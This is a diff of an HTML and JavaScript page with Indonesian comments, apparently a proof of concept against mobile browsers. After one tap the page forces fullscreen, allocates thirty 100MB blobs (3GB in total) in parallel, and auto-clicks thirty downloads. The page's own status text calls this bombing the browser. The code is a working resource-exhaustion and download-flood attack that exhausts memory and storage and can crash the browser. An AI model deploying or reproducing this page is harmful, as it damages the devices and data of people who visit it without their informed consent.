@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Auto Fullscreen & Race Multi-Download (30 Files)</title>
+  <title>Auto Fullscreen & Race Multi-Download (30 Files x 100MB)</title>
 
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -21,7 +21,6 @@
       max-width: 650px;
       margin: 40px auto;
     }
-    /* Memastikan tampilan penuh saat masuk mode fullscreen di Android */
     :fullscreen {
       background: #ffffff !important;
       padding: 20px !important;
@@ -40,7 +39,7 @@
       cursor: pointer;
       border: 0;
       border-radius: 6px;
-      background: #007bff;
+      background: #d32f2f; /* Mengubah warna ke merah sebagai penanda beban berat */
       color: #fff;
       font-weight: bold;
       font-size: 16px;
@@ -66,27 +65,27 @@
     #downloads a { 
       display: block; 
       padding: 8px;
-      background: #e8f5e9;
-      color: #2e7d32;
+      background: #ffebee;
+      color: #c62828;
       text-decoration: none;
       border-radius: 4px;
       font-size: 13px;
       text-align: center;
-      border: 1px solid #c8e6c9;
+      border: 1px solid #ffcdd2;
     }
   </style>
 </head>
 
 <body>
   <div class="panel" id="main-panel">
-    <h2>Mobile Auto-Fullscreen & 30 Files Download</h2>
-    <p style="margin-bottom: 15px;">Ketuk tombol di bawah. Halaman akan otomatis masuk layar penuh pada Android dan menembak 30 file secara race condition.</p>
+    <h2>Mobile Auto-Fullscreen & 30 Files x 100MB Download</h2>
+    <p style="margin-bottom: 15px;">Ketuk tombol di bawah. Halaman akan masuk layar penuh pada Android dan menembak 30 file (masing-masing 100MB, Total 3GB) secara paralel.</p>
 
     <p>
-      <button id="start" type="button">Masuk Fullscreen & Unduh 30 File</button>
+      <button id="start" type="button">Masuk Fullscreen & Unduh 30 File (3GB Total)</button>
     </p>
 
-    <p id="status" role="status">Siap menjalankan pengujian.</p>
+    <p id="status" role="status">Siap menjalankan pengujian beban berat.</p>
     <div id="downloads"></div>
   </div>
 
@@ -97,13 +96,17 @@
 
     let objectUrls = [];
 
-    // Fungsi Asinkronus untuk mempersiapkan Blob di Microtask Queue (Race Condition Preparation)
+    // Fungsi Asinkronus untuk mempersiapkan Blob 100MB di Microtask Queue
     const prepareBlobAsync = (i) => {
       return new Promise((resolve) => {
-        // Menggunakan queueMicrotask agar kalkulasi teks/blob berjalan secara paralel sebelum masuk ke antrean download DOM
         queueMicrotask(() => {
-          const content = `PoC file ${i}\nPengujian dengan metode pemisahan antrean paralel rawan race condition.\n`;
-          const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
+          // Ukuran 100 MB dalam Bytes (100 * 1024 * 1024)
+          const sizeInBytes = 104857600; 
+          
+          // Menggunakan Uint8Array agar alokasi memori biner berjalan instan tanpa membekukan JS engine
+          const dummyData = new Uint8Array(sizeInBytes); 
+          
+          const blob = new Blob([dummyData], { type: "application/octet-stream" });
           const url = URL.createObjectURL(blob);
           resolve({ id: i, url: url });
         });
@@ -115,8 +118,8 @@
       setTimeout(() => {
         const link = document.createElement("a");
         link.href = fileData.url;
-        link.download = `poc-race-${String(fileData.id).padStart(2, '0')}.txt`;
-        link.textContent = `File ${fileData.id}`;
+        link.download = `poc-100mb-${String(fileData.id).padStart(2, '0')}.bin`;
+        link.textContent = `File ${fileData.id} (100MB)`;
         downloads.appendChild(link);
 
         link.click();
@@ -124,12 +127,13 @@
     };
 
     start.addEventListener("click", () => {
-      // PEMBERSIHAN AWAL (Instan)
+      // PEMBERSIHAN MEMORI AGRESIF
+      // Sangat penting untuk melepaskan URL lama agar RAM mobile tidak langsung penuh (OOM)
       objectUrls.forEach(url => URL.revokeObjectURL(url));
       objectUrls = [];
       downloads.replaceChildren();
 
-      // 1. EKSEKUSI FULLSCREEN INSTAN (Prioritas Utama pada klik pertama)
+      // 1. EKSEKUSI FULLSCREEN INSTAN
       const docEl = document.documentElement;
       try {
         if (docEl.requestFullscreen) {
@@ -144,28 +148,25 @@
         console.warn(`Gagal masuk fullscreen: ${err.message}`);
       }
 
-      // 2. SKENARIO RACE CONDITION ASINKRONUS
-      // Menggunakan jeda 100ms agar animasi transisi fullscreen selesai tanpa patah-patah
+      // 2. SKENARIO RACE CONDITION BEBAN BERAT
       setTimeout(async () => {
-        status.textContent = "Layar penuh aktif. Menyiapkan data secara paralel...";
+        status.textContent = "Layar penuh aktif. Mengalokasikan 3GB memori di background...";
 
-        // Membuat 30 promise sekaligus untuk balapan di Microtask Queue
         const downloadPromises = [];
         for (let i = 1; i <= 30; i++) {
           downloadPromises.push(prepareBlobAsync(i));
         }
 
-        // Menunggu seluruh Blob siap secara bersamaan (Simultaneous Race)
+        // Menunggu seluruh 30 file siap di memori secara bersamaan
         const allFiles = await Promise.all(downloadPromises);
         
-        status.textContent = "Mengeksekusi pemboman 30 file ke browser...";
+        status.textContent = "Membom browser dengan 30 unduhan sekaligus!";
         
-        // Menembakkan unduhan masal secara asinkronus tercepat
         allFiles.forEach(fileData => {
           objectUrls.push(fileData.url);
           triggerInstantDownload(fileData);
         });
-      }, 100); 
+      }, 150); // Jeda dinaikkan sedikit menjadi 150ms demi stabilitas transisi grafik mobile
     });
   </script>
 </body>
